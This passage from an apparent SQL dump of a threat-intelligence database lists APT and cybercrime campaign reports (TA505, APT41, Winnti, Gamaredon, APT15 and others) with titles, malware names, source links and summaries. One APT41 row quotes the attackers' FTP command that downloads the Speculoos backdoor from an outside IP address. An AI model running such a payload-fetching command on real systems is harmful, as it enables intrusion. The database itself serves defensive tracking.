to the known TA505 hacking group, active since 2014 and focusing on Retail and Banking companies. The group is also known for some evasive techniques they put in place over time to avoid the security controls and penetrate corporate perimeters with several kinds of malware, for instance abusing the so called LOLBins (Living Off The Land Binaries), legit programs regularly used by victim, or also the abuse of valid cryptographically signed payloads.\n','2021-08-02 17:23:49','2021-08-02 17:23:49',NULL),(709,194,'TA505: Variety in Use of ServHelper and FlawedAmmyy','FlawedAmmyy RAT, ServHelper, .ISO image attachments, .NET downloader\n','https://www.trendmicro.com/en_us/research/19/h/ta505-at-it-again-variety-is-the-spice-of-servhelper-and-flawedammyy.html\n','','TA505 continues to show that as a cybercriminal group, they intend to wreak as much havoc while maximizing potential profits. Given the group\'s active campaigns since our updates in June and July, we continued following their latest campaigns. Just like in previous operations, they continue to make small changes, such as targeting other countries, entities, or the combination of techniques used for deployment, for each campaign. Despite the changes, TA505 continues to use either FlawedAmmyy RAT (remote access trojan) or ServHelper as payloads. However, over the last nine campaigns since our June report, they also started using .ISO image attachments as the point of entry, as well as a .NET downloader, a new style for macro delivery, a newer version of ServHelper, and a .DLL variant of FlawedAmmyy downloader. The group also started targeting new countries, such as Turkey, Serbia, Romania, Korea, Canada, the Czech Republic, and Hungary.\n','2021-08-02 17:28:05','2021-08-02 17:28:05',NULL),(710,0,'Iron Tiger APT Updates Toolkit With Evolved SysUpdate Malware','dlpumgr32.exe , DLPPREM32.DLL , DLPPREM32.bin , data.res , config.res \n','','','In 2019, Talent-Jump, Inc., a security service and system integration company, discovered several malware variants in a gambling company during an incident response operation and sought our help for further investigation and analysis.\nIn 2020 and 2021, Talent-Jump found new samples for malware families that are attributed to the Iron Tiger threat actor, which is also referred to as LuckyMouse, EmissaryPanda, and APT27.\nWhile investigating Operation DRBControl in 2019, we found several connections to multiple threat actors:','2021-08-03 08:15:03','2021-08-03 08:15:03',NULL),(711,29,'Big airline heist','','https://blog.group-ib.com/colunmtk_apt41','','On March 4, 2021, SITA, an international provider of IT services for the air transport industry worldwide, said it had suffered a security incident. The announcement, however, was not getting the attention it deserved until Air India, one of SITA\'s customers, reported a massive passenger data breach on May 21 caused by an earlier attack against SITA. Between March and May, various airline companies, including Singapore Airlines, Malaysia Airlines, and others, disclosed data breaches. All of those companies were SITA customers. After Air India revealed the details of its security breach, it became clear that the carriers were most likely dealing with one of the biggest supply chain attacks in the airline industry\'s history','2021-08-05 08:35:54','2021-08-05 08:35:54',NULL),(712,191,'ShadowPad: new activity from the Winnti group','','https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/shadowpad-new-activity-from-the-winnti-group/','','ShadowPad is used by Winnti (APT41, BARIUM, AXIOM), a group that has been active since at least 2012. This state-sponsored group originates from China2. The key interests of the group are espionage and financial gain. Their core toolkit consists of malware of their own making. Winnti uses complex attack methods, including supply chain and watering hole attacks. The group knows exactly who their victims are. They develop attacks very carefully and deploy their primary tools only after detailed reconnaissance of the infected system. The group attacks countries all over the world: Russia, the United States, Japan, South Korea, Germany, Mongolia, Belarus, India, and Brazil. The group tends to attack the following industries:','2021-08-05 08:58:44','2021-08-05 08:58:44',NULL),(713,5,'New Linux Backdoor RedXOR Likely Operated by Chinese Nation-State Actor',' PWNLNX, XOR.DDOS, Groundhog','https://www.intezer.com/blog/malware-analysis/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/','','2020 set a record for new Linux malware families. New malware families targeting Linux systems are being discovered on a regular basis. Backdoors attributed to advanced threat actors are disclosed less frequently.  We have discovered an undocumented backdoor targeting Linux systems, masqueraded as polkit daemon. We named it RedXOR for its network data encoding scheme based on XOR.    Based on victimology, as well as similar components and Tactics, Techniques, and Procedures (TTPs), we believe RedXOR was developed by high profile Chinese threat actors. The samples, which have low detection rates in VirusTotal, were uploaded from Indonesia and Taiwan, countries known to be targeted by Chinese threat actors. The samples are compiled with a legacy GCC compiler on an old release of Red Hat Enterprise Linux, hinting that RedXOR is used in targeted attacks against legacy Linux systems.','2021-08-05 10:16:22','2021-08-05 10:16:22',NULL),(714,26,'No “Game over” for the Winnti Group','modular backdoor','https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/','','The Winnti Group, active since at least 2012, is responsible for high-profile supply-chain attacks against the software industry, leading to the distribution of trojanized software (such as CCleaner, ASUS LiveUpdate and multiple video games) that is then used to compromise more victims. Recently, ESET researchers also discovered a campaign of the Winnti Group targeting several Hong Kong universities with ShadowPad and Winnti malware.','2021-08-05 10:24:50','2021-08-05 10:24:50',NULL),(715,0,'APT41 Using New Speculoos Backdoor to Target Organizations Globally','CVE-2019-19781, ','https://unit42.paloaltonetworks.com/apt41-using-new-speculoos-backdoor-to-target-organizations-globally/','Malware targeting BSD-based systems, Speculoos Backdoor','In this attack campaign, the adversaries exploited CVE-2019-19781 to direct the victim appliances to retrieve Speculoos over FTP using the command /usr/bin/ftp -o /tmp/bsd ftp://test:[redacted]\\@66.42.98[.]220/<filename> as reported by FireEye. Our data was consistent with this activity, with the first wave beginning on January 31, 2020 evening UTC to February 1, 2020 afternoon UTC using the filename bsd. This wave affected multiple higher education organizations in the United States, a healthcare organization in the United States, and a consulting firm in Ireland. A second wave began on February 24, 2020 morning UTC through February 24, 2020 after midnight UTC, this time using the filename un. This wave affected a higher education organization in Colombia, a manufacturing organization in Austria, a higher education organization targeted in the first wave in the United States, and a state government in the United States. While the data Unit 42 has access to is not exhaustive, examining the spread of victims we do have data on appears to indicate that this attack campaign may have been more of an opportunistic push by APT41 to gain footholds in a large number of organizations with minimal effort to expand their attack infrastructure.','2021-08-05 10:33:52','2021-08-05 10:33:52',NULL),(716,3,'Winnti Group targeting universities in Hong Kong','','https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/','','In November 2019, ESET’s machine-learning engine, Augur, detected a malicious and unique sample present on multiple computers belonging to two Hong Kong universities where the Winnti malware had already been found at the end of October. The suspicious sample detected by Augur is actually a new 32-bit ShadowPad launcher. Samples from both ShadowPad and Winnti found at these universities contain campaign identifiers and C&C URLs with the names of the universities, which indicates a targeted attack.','2021-08-05 10:42:01','2021-08-05 10:42:01',NULL),(717,6,'GAME OVER: Detecting and Stopping an APT41 Operation','','https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html','','In August 2019, FireEye released the “Double Dragon” report on our newest graduated threat group, APT41. A China-nexus dual espionage and financially-focused group, APT41 targets industries such as gaming, healthcare, high-tech, higher education, telecommunications, and travel services. APT41 is known to adapt quickly to changes and detections within victim environments, often recompiling malware within hours of incident responder activity. In multiple situations, we also identified APT41 utilizing recently-disclosed vulnerabilities, often weaponzing and exploiting within a matter of days.','2021-08-05 10:49:07','2021-08-05 10:49:07',NULL),(718,16,'Gaming industry still in the scope of attackers in Asia','','','','Although the malware uses different configurations in each case, the three affected software products included the same backdoor code and were launched using the same mechanism. While two of the compromised products no longer include the backdoor, one of the affected developers is still distributing the trojanized version: ironically, the game is named Infestation, and is produced by Thai developer Electronics Extreme. We have tried informing them several times, through various channels, since early February, but without apparent success','2021-08-05 11:01:18','2021-08-05 11:01:18',NULL),(719,16,'Some ASUS Updates Drop Backdoors on PCs in ‘Operation ShadowHammer’','','https://threatpost.com/asus-pc-backdoors-shadowhammer/143129/\nhttps://securelist.com/operation-shadowhammer/89992/','','A supply-chain attack dubbed “Operation ShadowHammer” has been uncovered, targeting users of the ASUS Live Update Utility with a backdoor injection. The China-backed BARIUM APT is suspected to be at the helm of the project.\n\nAccording to Kaspersky Lab, the campaign ran from June to at least November 2018 and may have impacted more than a million users worldwide – though the adversaries appear to have been after specific victims in Asia.\n\nThe threat surface is not small: The ASUS Live Update Utility is a pre-installed utility in most new ASUS computers, for automatic BIOS, UEFI, drivers and applications updates. Popular among gamers, ASUS ranks fifth in the laptop market, with a market share of 7.4 percent as of August 2018, according to TrendForce. With an estimated 41.08 million laptops shipped in that quarter, it means ASUS sold around 3 million of them for that time period. Gartner meanwhile pegged ASUS’ overall PC sales, including desktops and notebooks, to be just over 4 million in the third quarter of 2018 (translating into a 6 percent overall PC market share).','2021-08-05 11:12:06','2021-08-05 11:12:46',NULL),(720,32,'Suspected BITTER APT Continues Targeting Government','','','','','2021-08-05 11:45:21','2021-08-05 11:45:21',NULL),(721,32,'BITTER-a targeted attack against Pakistan','','','','','2021-08-05 12:03:24','2021-08-05 12:03:24',NULL),(722,121,'Multiple ArtraDownloader Variants','','','','Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader. We have named this malware family ArtraDownloader based on a PDB string discovered within the samples. We’ve observed three variants of this downloader with the earliest timestamp of February 2015.  This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operation','2021-08-05 12:05:33','2021-08-05 12:05:33',NULL),(723,27,'Confucius Uses Pegasus Spyware-related Lures to Target Pakistani Military','Pegasus','https://www.trendmicro.com/en_us/research/21/h/confucius-uses-pegasus-spyware-related-lures-to-target-pakistani.html',NULL,'Researchers found a recent spear phishing campaign that utilizes Pegasus spyware-related lures to entice victims into opening a malicious document downloading a file stealer. The NSO Group’s spyware spurred a collaborative investigation that found that it was being used to target high-ranking individuals in 11 different countries.','2021-08-19 19:01:41','2021-08-19 09:17:43','611e21b71a08edbfb6061a06'),(724,96,'Mobile Cyber Espionage Campaign Bouncing Golf Affects Middle East',NULL,'https://blog.trendmicro.com/trendlabs-security-intelligence/mobile-cyberespionage-campaign-bouncing-golf-affects-middle-east/',NULL,'TrendMicro uncovered a cyber espionage campaign targeting Middle Eastern countries. We named this campaign “Bouncing Golf” based on the malware’s code in the package named “golf.” The malware involved, which Trend Micro detects as  AndroidOS_GolfSpy.HRX, is notable for its wide range of cyber espionage capabilities. Malicious codes are embedded in apps that the operators repackaged from legitimate applications. Monitoring the command and control (C&amp;C) servers used by Bouncing Golf, we’ve so far observed more than 660 Android devices infected with GolfSpy. Much of the information being stolen appear to be military-related.','2021-08-27 10:08:40','2019-06-18 19:31:25','5d093c0e815e31a61883fc3b'),(725,29,'Domestic Kitten Mobile Malware',NULL,'https://mp.weixin.qq.com/s/yaLC8gs-U92X6WnYzuuQ7w',NULL,'','2021-08-27 10:08:40','2019-10-09 10:02:53','5d9db01cc5328d4649e0594c'),(726,52,'FIN7 Using Windows 11 Alpha-Themed Docs to Drop Javascript Backdoor','Sodinokibi,FIN7','https://www.anomali.com/blog/cybercrime-group-fin7-using-windows-11-alpha-themed-docs-to-drop-javascript-backdoor',NULL,'Anomali analyzes a recent campaign where the FIN7 threat actor employs malicious documents with a Windows 11-themed lure.','2021-09-03 19:01:45','2021-10-03 00:01:57','6131dd8772536483ad294965'),(727,244,'The Urpage Connection to Bahamut, Confucius and Patchwork',NULL,'https://blog.trendmicro.com/trendlabs-security-intelligence/the-urpage-connection-to-bahamut-confucius-and-patchwork/',NULL,'In the process of monitoring changes in the threat landscape, we get a clearer insight into the way threat actors work behind the schemes. In this case we dig deeper into the possible connection between cyberattacks by focusing on the similarities an unnamed threat actor shares with Confucius, Patchwork, and another threat actor called Bahamut. For the sake of this report, we will call this unnamed threat actor “Urpage.”\n\nWhat sets Urpage attacks apart is its targeting of InPage, a word processor for Urdu and Arabic languages. However, its Delphi backdoor component, which it has in common with Confucius and Patchwork, and its apparent use of Bahamut-like malware, is what makes it more intriguing as it connects Urpage to these other known threats.','2021-10-15 06:28:43','2018-10-26 09:32:40','5b86c1af84048207fdac6338'),(728,200,'RedFoxtrot: Targets Bordering Asian Countries','Icefog,PlugX - S0013,Royal Road,Poison Ivy,ShadowPad - S0596,PCShare,QUICKHEAL','https://go.recordedfuture.com/hubfs/reports/cta-2021-0616.pdf,https://github.com/Insikt-Group/Research/blob/master/RedFoxtrot%20June%202021',NULL,'Recorded Future’s Insikt Group has identified ties between a suspected Chinese state-sponsored threat activity group Recorded Future tracks as RedFoxtrot and the Chinese military intelligence apparatus, specifically People’s Liberation Army (PLA) Unit 69010 located in Ürümqi, Xinjiang. This activity offers a glimpse into PLA operations following a major organizational restructure beginning in 2015 and follows a period where public reporting has largely concentrated on groups affiliated with China’s Ministry of State Security (MSS).','2021-10-15 06:33:31','2021-06-18 10:08:16','60cc709013f5498fe7e60120'),(729,156,'Explosive New MirrorBlast Campaign Targets Financial Companies','MirrorBlast','https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies',NULL,'The Morphisec Labs team has tracked a new version of the “MirrorBlast” malware campaign, targeting financial services companies, but the attack chain is similar to that of Russia-based threat group TA505.','2021-10-15 19:02:59','2021-11-14 00:00:12','61694896e3ede538cc05526d'),(730,28,'Whatta TA: TA505 Ramps Up Activity, Delivers New FlawedGrace Variant','FlawedGrace,KiXtart,TA505,Get2,MirrorBlast','https://www.proofpoint.com/us/blog/threat-insight/whatta-ta-ta505-ramps-activity-delivers-new-flawedgrace-variant',NULL,'Since early September 2021, Proofpoint researchers are tracking renewed malware campaigns by the financially driven TA505. The campaigns, which are distributed across a wide range of industries, started with low volume email waves that ramped up in late September, resulting in tens to hundreds of thousands of emails.\n\nMany of the campaigns, especially the large volume ones, strongly resemble the historic TA505 activity from 2019 and 2020. The commonalities include similar domain naming conventions, email lures, Excel file lures, and the delivery of the FlawedGrace remote access trojan (RAT). The campaigns also contain some noteworthy, new developments, such as retooled intermediate loader stages scripted in Rebol and KiXtart, which are used instead of the previously popular Get2 downloader. The new downloaders perform similar functionality of reconnaissance and pulling in the next stages. Lastly, there is an updated version of FlawedGrace.','2021-10-19 19:02:54','2021-11-18 00:03:47','616edb080c112a848f7ad53f'),(731,20,'Thamar Reservoir','','https://www.clearskysec.com/thamar-reservoir/','','The campaign includes several different attacks with the aim of taking over the target’s computer or gain access to their email account. We estimate that this access is used for espionage or other nation-state interests, and not for monetary gain or hacktivism. In some cases, the victim is not the final target; the attackers use the infected computer, email, or stolen credentials as a platform to further attack their intended target.','2021-10-20 17:01:32','2021-10-20 17:01:32',NULL),(732,20,'Iranian PupyRAT Bites Middle Eastern Organizations',' PupyRAT','https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations','','a phishing campaign that targeted a Middle Eastern organization in early January 2017. Some of messages were sent from legitimate email addresses belonging to several Middle Eastern organizations.','2021-10-20 17:16:41','2021-10-20 17:16:41',NULL),(733,19,'The Kittens Are Back in Town','','','','Charming Kitten, also known as APT35 or Ajax, is an Iranian cyberespionage group active since 20141. Their primary targets are Iranian experts working in the Academy, human rights activists and media personnel. Most victims are in the Middle East, US and the UK','2021-10-20 17:29:18','2021-10-20 17:29:18',NULL),(734,1,'APT35 ‘Charming Kitten\' discovered in a pre-infected environment','','https://www.darktrace.com/en/blog/apt-35-charming-kitten-discovered-in-a-pre-infected-environment/','Cortanaservice[.]com, port 443, beacon intervals at 100 seconds','APT35, sometimes referred to as Charming Kitten, Imperial Kitten, or Tortoiseshell, is a notorious cyber-espionage group which has been active for nearly 10 years. Famous for stealing scripts from HBO’s Game of Thrones in 2017 and suspected of interfering in the U.S. presidential election last year, it has launched extensive campaigns against organizations and officials across North America and the Middle East. Public attribution has associated APT35 with an Iran-based nation state threat acto','2021-10-20 17:34:41','2021-10-20 17:34:41',NULL),(735,0,'MirageFox: APT15 Resurfaces With New Tools Based On Old Ones','','https://www.intezer.com/blog/research/miragefox-apt15-resurfaces-with-new-tools-based-on-old-ones/','','Coincidentally, following the recent hack of a US Navy contractor and theft of highly sensitive data on submarine warfare, we have found evidence of very recent activity by a group referred to as APT15, known for committing cyber espionage which is believed to be affiliated with the Chinese government. The malware involved in this recent campaign, MirageFox, looks to be an upgraded version of a tool, a RAT believed to originate in 2012, known as Mirage.\n\nAPT15 is known for committing cyberespionage against companies and organizations located in many different countries, targeting different sectors such as the oil industry, government contractors, military, and more. They are known for “living off the land,” meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target. Other names for the group are Vixen Panda, Ke3chang, Royal APT, and Playful Dragon.','2021-10-20 17:47:55','2021-10-20 18:18:49',NULL),(736,3,'OPERATION SAFFRON ROSE','','https://www.mandiant.com/resources/operation-saffron-rose','','As the crisis in Syria escalates, FireEye research-ers have discovered a cyber espionage campaign, which we call “Ke3chang,” that falsely advertises information updates about the ongoing crisis to compromise MFA networks in Europe. We believe that the Ke3chang attackers are operating out of China and have been active since at least 2010. However, we believe specific Syria-themed attacks against MFAs (codenamed by Ke3chang as “moviestar”) began only in August 2013. The timing of the attacks precedes a G20 meeting held in Russia that focused on the crisis in Syria.','2021-10-20 17:57:33','2021-10-20 17:57:33',NULL),(737,29,'Forced to Adapt: XSLCmd Backdoor Now on OS X','','https://www.fireeye.com/blog/threat-research/2014/09/forced-to-adapt-xslcmd-backdoor-now-on-os-x.html','','Across the global threat landscape, there has been a clear history of leveraging (or porting) Windows malware to the Apple OS X platform. In 2012, AlienVault discovered a document file exploiting an older vulnerability in Microsoft Word that installs a backdoor named “MacControl” on OS X systems. The group responsible for those attacks had been targeting Tibetan non-government organizations (NGOs). It was later discovered that the code for this backdoor was borrowed from an existing Windows backdoor, whose source code can be found on several Chinese programming forums.\n\nIn 2013, Kaspersky reported on a threat actor group they named “IceFog” that had been attacking a large number of entities related to military, mass media, and technology in South Korea and Japan. This group developed their own backdoor for both Windows and OS X. And just this year, Kaspersky published a report on a group they named \"Careto/Mask\" that utilized an open source netcat-like project designed to run on *nix and Windows systems named ‘sbd’ which they wrapped in a custom built installer for OS X.\n\nBased on our historical intelligence, we believe the XSLCmd backdoor is used by APT, including a group that we call “GREF.” We track this threat group as “GREF” due to their propensity to use a variety of Google references in their activities – some of which will be outlined later in this report. Our tracking of GREF dates back to at least the 2009 timeframe, but we believe they were active prior to this time as well.   Historically, GREF has targeted a wide range of organizations including the US Defense Industrial Base (DIB), electronics and engineering companies worldwide, as well as foundations and other NGO’s, especially those with interests in Asia.','2021-10-20 18:02:02','2021-10-20 18:02:02',NULL),(738,29,'The Evolution of APT15’s Codebase 2020','','https://www.intezer.com/blog/research/the-evolution-of-apt15s-codebase-2020/','Ketrum malware','The three samples we discovered seem to be a mix of the Ketrican and Okrum backdoors documented by researchers at ESET in 2019. Features have been merged from these two malware families to create a different RAT class for the group. We’ve decided to call this umbrella of malware “Ketrum.”\n\nThe new samples we found continue the Ke3chang group’s strategy of using a basic backdoor to gain control over the victim’s device, so that an operator can then connect to it and run commands manually to conduct further operations.','2021-10-20 18:07:35','2021-10-20 18:07:35',NULL),(739,107,'Operation Armageddon',NULL,NULL,NULL,'“Operation Armageddon,” active since at least mid-2013, exposes a cyber espionage campaign devised to provide a military advantage to Russian leadership by targeting Ukrainian government, law enforcement, and military officials in order to steal information that can provide insight into near term Ukrainian intentions and plans. The Security Service of Ukraine (SBU) is continuously investigating this active threat, and has issued statements attributing the attacks to specific branches of the Russian Federal Security Service (FSB). Technical and temporal analysis of the campaign supports these statements and indicates a direct correlation between the cyber attacks and the ongoing war, highlighting an alarming blend between cyber espionage, physical warfare, and the driving political forces behind them.','2021-10-20 18:25:38','2017-03-12 01:33:45','5541029cb45ff5029b148b7f'),(740,270,'The Gamaredon Group Toolset Evolution',NULL,'http://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/?adbsc=social70398906&amp;adbid=836356242436055042&amp;adbpl=tw&amp;adbpr=4487645412,https://www.symantec.com/security_response/writeup.jsp?docid=2015-042917-4812-99&amp;tabid=2',NULL,'Unit 42 threat researchers have recently observed a threat group distributing new, custom developed malware. We have labelled this threat group the Gamaredon Group and our research shows that the Gamaredon Group has been active since at least 2013.','2021-10-20 18:25:38','2019-06-07 19:03:33','58b558ed5781fb368ec797ab'),(741,265,'Ukraine detects new Pterodo backdoor malware, warns of Russian cyberattack',NULL,'https://cert.gov.ua/news/46,https://blog.threatstop.com/russian-apt-gamaredon-group,https://www.securityartwork.es/wp-content/uploads/2019/01/GREIN-Grupo-GAMAREDON.pdf',NULL,'The Computer Emergency Response Team of Ukraine (CERT-UA) and the Foreign Intelligence Service of Ukraine have detected a new strain of the Pterodo Windows backdoor targeting computers at Ukrainian government agencies, leading officials in Kiev to warn of a pending large-scale cyber attack.','2021-10-20 18:25:39','2019-03-19 10:15:45','5bf582c501e3ba72b2ac0d53'),(742,11,'Deeper Dive into Gamaredon Group Pteranodon Implant',NULL,'https://www.vkremez.com/2019/01/lets-learn-deeper-dive-into-gamaredon.html',NULL,'While looking into one of the latest Pterodo toolkit samples attributed to Gamaredon Group, I decided to take a deeper dive into the malware chain and associated tools and scripts.','2021-10-20 18:25:39','2019-01-07 10:11:50','5c3325e6f8f5b54d022c39b4'),(743,46,'Infrastructure from Gameradon group',NULL,'https://www.vkremez.com/2019/01/lets-learn-deeper-dive-into-gamaredon.html,https://blog.threatstop.com/russian-apt-gamaredon-group',NULL,'Infrastructure and file pivots from Gameradon group','2021-10-20 18:25:39','2019-02-07 20:08:07','5c5c9027500d545172162daf'),(744,43,'Continued activity by Gamaredon Group',NULL,'https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=1417',NULL,'Continued attacks linked to Russian group of attackers, primarily targeting Ukraine.','2021-10-20 18:25:39','2019-04-30 09:01:16','5cc80eba055a4f569561dad5'),(745,118,'Gamaredon Continues to Attack Ukraine',NULL,'https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=1417',NULL,'','2021-10-20 18:25:39','2019-06-13 10:43:12','5d0228c0e1798d41499d4478'),(746,128,'Gamaredon July Activity',NULL,NULL,NULL,'Early indication of Gamaredon activity with use of the Pterodo implant.','2021-10-20 18:25:39','2019-08-05 14:55:20','5d1bb9f9fecd852c27ceb5d8'),(747,23,'EvilGnome Rare Malware Spying on Linux Desktop Users',NULL,'https://www.intezer.com/blog-evilgnome-rare-malware-spying-on-linux-desktop-users/',NULL,'Linux desktop remains an unpopular choice among mainstream desktop users, making up a little more than 2% of the desktop operating system market share. This is in contrast to the web server market share, which consists of 70% of Linux-based operating systems. Consequently, the Linux malware ecosystem is plagued by financial driven crypto-miners and DDoS botnet tools which mostly target vulnerable servers.','2021-10-20 18:25:39','2019-07-18 09:22:30','5d2f78275d79002092e0738b'),(748,229,'Gamaredon uses Strait of Hormuz Themed Phishing Document','Pteranodon','https://twitter.com/Arkbird_SOLG/status/1154587261595475968',NULL,'','2021-10-20 18:25:39','2019-08-13 11:51:54','5d3ac45e3bc2987b3b0031dc'),(749,54,'The Gamaredon Group: A TTP Profile Analysis',NULL,'https://www.fortinet.com/blog/threat-research/gamaredon-group-ttp-profile-analysis.html',NULL,'FortiGuard Labs recently discovered a fresh malicious campaign being run by the Gamaredon Group possibly targeting Ukrainian law enforcement and government agencies. We decided to provide an analysis of the current campaign, particularly focusing on the tools and methods used by these malicious actors to try to understand their methodologies and what resources are needed to launch these types of attacks. Additional IOCs have been added to this pulse from Alien Labs telemetry.','2021-10-20 18:25:40','2019-10-14 20:39:33','5d5efefd4bc0eabbe33b9eb9'),(750,14,'Cyberwarfare: A deep dive into the latest Gamaredon Espionage Campaign','Trojan:Win32/Gamaredon','https://blog.yoroi.company/research/cyberwarfare-a-deep-dive-into-the-latest-gamaredon-espionage-campaign/',NULL,'Gamaredon Group is a Cyber Espionage persistent operation attributed to Russians FSB (Federal Security Service) in a long-term military and geo-political confrontation against the Ukrainian government and more in general against the Ukrainian military power.','2021-10-20 18:25:40','2020-02-17 15:55:05','5e4aab8dd03e5de8441ebbc7'),(751,47,'Gamaredon APT Group Use Covid-19 Lure in Campaigns','','https://www.trendmicro.com/en_us/research/20/d/gamaredon-apt-group-use-covid-19-lure-in-campaigns.html','','Gamaredon is an advanced persistent threat (APT) group that has been active since 2013. Their campaigns are generally known for targeting Ukrainian government institutions. From late 2019 to February of this year, researchers published several reports on Gamaredon, tracking the group’s activities.\nIn March, we came across an email with a malware attachment that used the Gamaredon group’s tactics. Some of the emails used the coronavirus pandemic as a topic to lure victims into opening emails and attachments. These campaigns targeted victims in European countries and others.','2021-10-20 18:25:40','2021-10-20 18:36:29',NULL),(752,10,'Gamaredon group grows its game','Trojan:Win32/Gamaredon,Trojan:Win32/Pterodo,MSIL/Pterodo,Win64/Pterodo,Win32/Pterodo,DOC/TrojanDownloader.Agent','https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/',NULL,'Active APT group adds cunning remote template injectors for Word and Excel documents; unique Outlook mass-mailing macro','2021-10-20 18:25:42','2020-06-11 16:29:26','5ee25be63ddc0738f1a48307'),(753,83,'Primitive Bear (Gamaredon) Targets Ukraine with Timely Themes','DOCX/CVE-2017-11882,Exploit.Xml.CVE-2017-0199','https://www.anomali.com/blog/primitive-bear-gamaredon-targets-ukraine-with-timely-themes',NULL,'Anomali Threat Research discovered a campaign targeting Ukrainian government officials with malicious files that could be repurposed to target government officials of other countries. Anomali assesses with high confidence that this activity was conducted by Russia-sponsored cyberespionage group Primitive Bear (Gamaredon). Primitive Bear was observed distributing .docx files that attempted to download a .dot file via remote templates.','2021-10-20 18:25:42','2021-05-20 00:00:02','607ee151cc7a0fe7b63dc8ae'),(754,47,'Russia-Sponsored Group Employs Apparently Legitimate Documents Aligned to Growing Hostilities Between Russia and Ukraine','','https://www.anomali.com/blog/primitive-bear-gamaredon-targets-ukraine-with-timely-themes','','malicious samples that align with the Russia-sponsored cyberespionage group Primitive Bear’s (Gamaredon, Winterflounder) tactics, techniques, and procedures (TTPs).[1] The group was distributing .docx files that attempted to download .dot files from remote templates. The final objective of this campaign remains unclear as the remote template domains were down at the time of discovery. We observed Primitive Bear activity in late 2019, and again in April 2020, during which time they used similar TTPs and Ukrainian government-themed decoys.[2] In those campaigns, Primitive Bear’s decoys loaded a remote template to drop a .dot file that would determine if the compromised machine was worthy of a second-stage payload.[3]\n\nPrimitive Bear, known primarily to focus on Ukraine, has been very active in 2021. However, the themes of the samples we found, as well as those shared by the security community, could also be used to target multiple former Union of Soviet Socialist Republic (USSR) countries.','2021-10-20 18:30:20','2021-10-20 18:30:20',NULL),(755,31,'Operation “Shaheen”','','','','Pakistan is at the center of a new, unusually complex espionage effort unveiled by Cylance.\nOperation Shaheen is a year-long, ongoing campaign aimed at the nuclear-armed country’s\ngovernment and military. It is the work of a previously undisclosed threat actor whose unique\nstyle of attack has, until now, remained out of the public eye — a success they have taken\ngreat pains to achieve. We call this threat actor The White Company in acknowledgement\nof the many elaborate measures they take to whitewash all signs of their activity and evade\nattribution.\nIn our judgment, The White Company is likely a state-sponsored group, with access to zeroday\nexploits and exploit developers.\nWe have observed The White Company evolve, modify, and refine both its exploits and its\nmalware. They craft advanced tools that are mission-specific and tailored to esoteric target\nenvironments.','2021-10-20 18:54:46','2021-10-20 18:54:46',NULL),(756,18,'Operation Oceansalt','','https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-oceansalt.pdf\nhttps://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/operation-oceansalt-delivers-wave-after-wave/','','McAfee® Advanced Threat Research and Anti-Malware Operations teams have discovered\nanother unknown data reconnaissance implant targeting Korean-speaking users. We\nhave named this threat Operation Oceansalt based on its similarity to the earlier malware\nSeasalt, which is related to earlier Chinese hacking operations. Oceansalt reuses a portion\nof code from the Seasalt implant (circa 2010) that is linked to the Chinese hacking group\nComment Crew. Oceansalt appears to have been part of an operation targeting South\nKorea, United States, and Canada in a well-focused attack. A variation of this malware has\nbeen distributed from two compromised sites in South Korea. (They are currently offline.)\nOceansalt appears to be the first stage of an advanced persistent threat. The malware can\nsend system data to a control server and execute commands on infected machines, but\nwe do not yet know its ultimate purpose. The Advanced Threat Research team has not\npreviously described this implant in any of our analyses.','2021-10-21 10:01:33','2021-10-21 10:01:33',NULL),(757,98,'A Detailed Examination of the Siesta Campaign','','','','FireEye recently looked deeper into the activity discussed in TrendMicro’s blog and dubbed the “Siesta” campaign. The tools, modus operandi, and infrastructure used in the campaign present two possibilities: either the Chinese cyber-espionage unit APT1 is perpetrating this activity, or another group is using the same tactics and tools as the legacy APT1.\n\nThe Siesta campaign reinforces the fact that analysts and network defenders should remain on the lookout for known, public indicators and for shared attributes that allow security experts to detect multiple actors with one signature.','2021-10-21 11:07:06','2021-10-21 11:07:06',NULL),(758,37,'Espionage Campaign Targets Telecoms Organizations across Middle East and Asia',NULL,'https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-telecoms-asia-middle-east',NULL,'Organizations in Israel, Jordan, Kuwait, Saudi Arabia, the United Arab Emirates, Pakistan, Thailand, and Laos were targeted in the campaign, which appears to have made no use of custom malware and instead relied on a mixture of legitimate tools, publicly available malware, and living-off-the-land tactics. While the identity of the attackers remains unconfirmed, there is some evidence to suggest a link to the Iranian Seedworm (aka MuddyWater) group.  The targeting and tactics are consistent with Iranian-sponsored actors.','2021-12-14 19:01:21','2021-12-14 15:22:13','61b8b6a666a6707ae9ccce49'),(759,29,'Iranian intel cyber suite of malware uses open source tools','MuddyWater,Mori,PowGoop','https://www.cybercom.mil/Media/News/Article/2897570/iranian-intel-cyber-suite-of-malware-uses-open-source-tools/,https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/',NULL,'The United States Cyber Command (CYBERCOM) has identified and disclosed multiple tools that Iranian intelligence actors are using in networks around the world, according to a report from the US Department of Defense.','2022-01-13 19:03:31','2022-01-13 09:18:32','61dfe35d4ffb7b92b8c2cf93'),(760,17,'FIN7 Uses Flash Drives to Spread Remote Access Trojan','IceBot,BadUSB','https://geminiadvisory.io/fin7-flash-drives-spread-remote-access-trojan/',NULL,'Recorded Future has released an in-depth analysis of keystroke injection malware, using the Arduino microcontroller programming platform to inject keystrokes into victims’ computer systems, as part of a series of attacks.','2022-01-18 19:02:13','2022-02-17 00:02:58','61e683b7d020b229a3c12849'),(761,53,'New espionage attack by Molerats 